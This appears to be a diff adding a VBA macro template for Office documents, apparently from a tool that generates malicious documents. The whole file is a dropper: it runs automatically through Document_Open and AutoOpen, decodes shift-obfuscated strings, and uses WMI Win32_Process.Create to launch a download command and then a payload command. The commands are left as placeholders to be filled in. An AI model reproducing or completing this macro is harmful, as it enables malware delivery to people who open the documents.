@@ -1,0 +1,57 @@
+#If VBA7 Then
+    Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal milliseconds As LongPtr) 'MS Office 64 Bit
+#Else
+    Public Declare Sub Sleep Lib "kernel32" (ByVal milliseconds as Long) 'MS Office 32 Bit
+#End If
+
+Public Function SplitString(StringToSplit As String, n As Long) As String()
+    Dim i As Long, arrCounter As Long
+    Dim tmp() As String
+
+    ReDim tmp(0 To CLng(Len(StringToSplit) / n))
+
+    For i = 1 To Len(StringToSplit) Step n
+        tmp(arrCounter) = Mid(StringToSplit, i, n)
+        arrCounter = arrCounter + 1
+    Next i
+
+    SplitString = tmp
+End Function
+
+Function ReverseString(EncodedCommand As String) As String
+    Dim PayLoadAscii As String
+    Dim PayLoad As String
+    Dim arr_TotalList() As String
+
+    PayLoad = Join(SplitString(EncodedCommand, 3), Chr(44))
+    PayLoad = Left(PayLoad, Len(PayLoad) - 1)
+    arr_TotalList() = Split(PayLoad, Chr(44))
+
+    For i = 0 To UBound(arr_TotalList())
+         PayLoadAscii = Chr(arr_TotalList(i) - {Shift}) & PayLoadAscii
+    Next i
+    ReverseString = PayLoadAscii
+End Function
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim VerifyExecution As String
+    Dim ExecDownload As String
+    Dim ExecShell As String
+
+    ExecDownload = ReverseString({DownloadExecution_Command})
+    GetObject(ReverseString("{winmgmts}")).Get(ReverseString("{Win32_Process}")).Create ExecDownload, Null, Null, pid
+
+    sleep(15000)
+
+    ExecShell = ReverseString({PayloadExecution_Command})
+    GetObject(ReverseString("{winmgmts}")).Get(ReverseString("{Win32_Process}")).Create ExecShell, Null, Null, pid
+
+End Sub
